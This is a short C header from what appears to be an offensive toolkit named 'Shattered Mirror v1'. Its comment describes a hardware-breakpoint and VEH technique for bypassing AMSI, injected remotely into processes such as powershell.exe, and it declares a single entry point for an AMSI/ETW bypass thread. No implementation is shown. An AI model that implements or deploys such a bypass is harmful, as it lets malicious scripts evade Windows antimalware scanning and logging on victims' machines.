#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 04: Standalone AMSI Bypass
 *
 * This Atom encapsulates the Hardware Breakpoint VEH bypass in a way that
 * can be injected directly into script host processes (like powershell.exe)
 * remotely to neuter them before passing scripts to them.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_04_AMSI_H
#define SMIRROR_ATOM_04_AMSI_H

#include <windows.h>

/* Launch the AMSI/ETW bypass thread */
DWORD WINAPI AMSIBypassAtomMain(LPVOID lpParam);

#endif /* SMIRROR_ATOM_04_AMSI_H */
